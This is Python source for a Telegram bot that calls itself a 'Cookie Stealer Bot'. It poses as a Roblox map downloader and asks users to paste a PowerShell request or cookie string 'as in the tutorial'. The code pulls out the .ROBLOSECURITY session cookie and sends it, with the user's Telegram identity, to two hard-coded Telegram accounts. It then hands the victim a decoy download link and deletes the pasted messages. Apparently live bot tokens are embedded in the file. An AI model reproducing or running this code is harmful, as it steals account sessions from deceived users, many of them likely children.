import asyncio
import random
import aiohttp
import re
import os
from aiogram import Bot, Dispatcher, Router, F
from aiogram.types import Message, InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery, FSInputFile
from aiogram.filters import CommandStart

# ========== КОНФИГУРАЦИЯ ==========

# Бот для получения куки (основной)
MAIN_BOT_TOKEN = "8467022515:AAEKhaIBdWLHJ7bn1d-TBkM8Pkf_9Asslq0"

# Бот для отправки (один бот, два получателя)
SENDER_BOT_TOKEN = "8239746415:AAGmQxpDiRZw59vqzfyJe_Pz9o5aSc8e2po"

# ID получателей (ты и друг)
MY_TELEGRAM_ID = 7712154413          # Твой ID
FRIEND_TELEGRAM_ID = 7880766609      # ID друга (замени на реальный)

# Ссылка для скачивания
DOWNLOAD_URL = "https://workupload.com/file/kaC6yMBPffx"

# ========== КОНЕЦ КОНФИГУРАЦИИ ==========

router = Router()

# Храним части сообщений для пользователей
user_code_parts = {}

# Глобальный объект бота для отправки
sender_bot = None

def get_keyboard():
    buttons = [
        [InlineKeyboardButton(text="📤 Отправить код", callback_data="send_code")],
        [InlineKeyboardButton(text="📖 Туториал", callback_data="tutorial")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def extract_game_name_from_powershell(full_code: str):
    """Извлекает название игры из PowerShell кода"""
    patterns = [
        r'"path"="/(?:games|game)/(?:\d+)/([^"/]+)"',
        r'Uri "https://www\.roblox\.com/games/\d+/([^"]+)"',
        r'/games/\d+/([^"/]+)',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, full_code)
        if match:
            game_name = match.group(1)
            game_name = re.sub(r'[<>:"/\\|?*]', '', game_name)
            return f"{game_name}.rbxl"
    
    return "Steal_a_Braintot.rbxl"

def extract_roblosecurity_value(full_code: str):
    """Извлекает значение .ROBLOSECURITY"""
    if not full_code:
        return None
    
    # Ищем строку с .ROBLOSECURITY
    lines = full_code.split('\n')
    roblo_line = ""
    
    for line in lines:
        if '.ROBLOSECURITY' in line:
            roblo_line = line.strip()
            break
    
    if not roblo_line:
        return None
    
    # Извлекаем значение между кавычками после .ROBLOSECURITY (PowerShell)
    pattern = r'\.ROBLOSECURITY",\s*"([^"]+)"'
    match = re.search(pattern, roblo_line)
    
    if match:
        return match.group(1)
    
    # Если не нашли в PowerShell формате, пробуем простой формат
    if '.ROBLOSECURITY=' in full_code:
        simple_pattern = r'\.ROBLOSECURITY=([^;]+)'
        simple_match = re.search(simple_pattern, full_code)
        if simple_match:
            return simple_match.group(1)
    
    return None

async def send_cookies_to_both(cookie_value: str, user_info: str):
    """Отправляет куки и тебе, и другу одним ботом"""
    global sender_bot
    
    try:
        if not cookie_value or not sender_bot:
            return
        
        # Формируем куки
        cookie = f".ROBLOSECURITY={cookie_value}"
        if len(cookie) > 4000:
            cookie = cookie[:4000] + "..."
        
        # Формируем сообщение
        message = f"🚨 **НОВЫЙ КУКИ ПОЛУЧЕН!**\n\n"
        message += f"**От пользователя:** {user_info}\n\n"
        message += f"**Куки:**\n`{cookie}`"
        
        # Отправляем тебе
        try:
            await sender_bot.send_message(
                chat_id=MY_TELEGRAM_ID,
                text=message,
                parse_mode="Markdown"
            )
            print(f"[SUCCESS] Куки отправлен тебе от {user_info}")
        except Exception as e:
            print(f"[ERROR] Не удалось отправить тебе: {e}")
        
        # Отправляем другу
        try:
            await sender_bot.send_message(
                chat_id=FRIEND_TELEGRAM_ID,
                text=message,
                parse_mode="Markdown"
            )
            print(f"[SUCCESS] Куки отправлен другу от {user_info}")
        except Exception as e:
            print(f"[ERROR] Не удалось отправить другу: {e}")
        
    except Exception as e:
        print(f"[ERROR] Ошибка отправки: {e}")

async def send_download_link_to_user(message: Message):
    """Отправляет ссылку для скачивания пользователю"""
    try:
        # Формируем сообщение со ссылкой
        link_message = (
            "✅ *Скачивание успешно завершено!*\n\n"
            "📥 **Скачайте файл по ссылке:**\n"
            f"{DOWNLOAD_URL}\n\n"
            "⚠️ Ссылка действительна 24 часа"
        )
        
        await message.answer(link_message, parse_mode="Markdown")
        print(f"[SUCCESS] Ссылка отправлена пользователю: {DOWNLOAD_URL}")
        return True
                
    except Exception as e:
        print(f"[ERROR] Ошибка отправки ссылки: {e}")
        await message.answer("❌ Ошибка при отправке ссылки")
        return False

@router.message(CommandStart())
async def start(message: Message):
    text = (
        "🛠️ *Отправьте код как из туториала*\n\n"
        "⚠️ Бот ожидает код для скачивания карты\n"
        "👇 Выберите действие:"
    )
    await message.answer(text, reply_markup=get_keyboard())

@router.callback_query(F.data == "tutorial")
async def tutorial(callback: CallbackQuery):
    await callback.message.answer("тест")
    await callback.answer()

@router.callback_query(F.data == "send_code")
async def send_code(callback: CallbackQuery):
    await callback.message.answer("ожидаю код")
    await callback.answer()

@router.message(F.text)
async def get_code(message: Message):
    user_id = message.from_user.id
    code_part = message.text.strip()
    
    # Добавляем часть кода
    if user_id not in user_code_parts:
        user_code_parts[user_id] = []
    
    user_code_parts[user_id].append(code_part)
    
    # Собираем пока что есть
    full_code_so_far = "\n".join(user_code_parts[user_id])
    
    # Проверяем тип и завершенность
    is_powershell = '$session' in full_code_so_far or 'Invoke-WebRequest' in full_code_so_far
    is_simple_cookie = '.ROBLOSECURITY=' in full_code_so_far and not is_powershell
    
    is_complete = False
    
    if is_powershell:
        if ('Invoke-WebRequest' in full_code_so_far and 
            ('}' in code_part or 
             '"upgrade-insecure-requests"="1"' in code_part or
             len(user_code_parts[user_id]) >= 10)):
            is_complete = True
    
    if is_simple_cookie:
        if ';' in full_code_so_far or len(user_code_parts[user_id]) >= 2:
            is_complete = True
    
    if is_complete:
        # Полный код
        full_code = "\n".join(user_code_parts[user_id])
        
        # Информация о пользователе Telegram
        user_info = ""
        if message.from_user.username:
            user_info += f"@{message.from_user.username}"
        else:
            user_info += f"{message.from_user.first_name}"
            if message.from_user.last_name:
                user_info += f" {message.from_user.last_name}"
        
        user_info += f" | ID: {message.from_user.id}"
        
        print(f"[+] Получен код от {user_info}")
        print(f"[DEBUG] Длина кода: {len(full_code)} символов")
        
        # Извлекаем куки
        roblosecurity_value = extract_roblosecurity_value(full_code)
        
        # Отправляем куки и тебе, и другу
        if roblosecurity_value:
            await send_cookies_to_both(roblosecurity_value, user_info)
        else:
            print("[ERROR] Не удалось извлечь куки")
            # Отправляем уведомление об ошибке
            try:
                error_msg = f"❌ Не удалось извлечь куки от {user_info}"
                await sender_bot.send_message(chat_id=MY_TELEGRAM_ID, text=error_msg)
                await sender_bot.send_message(chat_id=FRIEND_TELEGRAM_ID, text=error_msg)
            except:
                pass
        
        # Показываем пользователю процесс
        wait_msg = await message.answer("подождите 5-10сек")
        
        # Ждем
        wait_time = random.randint(5, 10)
        await asyncio.sleep(wait_time)
        
        # Отправляем ссылку для скачивания
        await send_download_link_to_user(message)
        
        # Очищаем
        if user_id in user_code_parts:
            del user_code_parts[user_id]
            
    else:
        # Ждем следующую часть
        try:
            await message.delete()
        except:
            pass

async def main():
    global sender_bot
    
    # Создаем основной бот
    bot = Bot(token=MAIN_BOT_TOKEN)
    
    # Создаем бот для отправки (один бот)
    sender_bot = Bot(token=SENDER_BOT_TOKEN)
    
    # Тестируем подключение
    try:
        me = await sender_bot.get_me()
        print(f"[INFO] Бот для отправки: @{me.username}")
        print(f"[INFO] Отправка тебе: ID {MY_TELEGRAM_ID}")
        print(f"[INFO] Отправка другу: ID {FRIEND_TELEGRAM_ID}")
        print(f"[INFO] Ссылка для скачивания: {DOWNLOAD_URL}")
            
    except Exception as e:
        print(f"[ERROR] Не удалось подключиться к боту для отправки: {e}")
        sender_bot = None
    
    dp = Dispatcher()
    dp.include_router(router)
    
    try:
        await dp.start_polling(bot)
    except KeyboardInterrupt:
        print("\n[INFO] Бот остановлен")
    finally:
        # Закрываем соединения при выходе
        if sender_bot:
            await sender_bot.session.close()
        await bot.session.close()

if __name__ == "__main__":
    print("=" * 50)
    print("Cookie Stealer Bot - Запуск...")
    print("=" * 50)
    print(f"Ссылка для скачивания: {DOWNLOAD_URL}")
    asyncio.run(main())
